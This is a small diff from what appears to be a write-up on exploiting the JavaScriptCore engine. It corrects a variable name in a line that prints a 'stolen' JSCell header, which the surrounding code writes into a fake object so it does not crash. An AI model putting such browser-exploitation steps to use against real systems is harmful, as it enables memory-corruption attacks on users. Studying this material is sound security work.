@@ -598,7 +598,7 @@ fortunately fairly easy: execute the same get_by_val op twice, the second time w
         results.push(a[0]); //push the results to results array
     }
     var jscell_header = results[0]; //make jscell_header equal that of victim1
-    print("Stolen Real Cell Header: " + new Int64.fromDouble(js_header))
+    print("Stolen Real Cell Header: " + new Int64.fromDouble(jscell_header))
 //now we can set container to the real JSCellHeader so we wont ever crash :)
 	      container.header = jscell_header
 	      
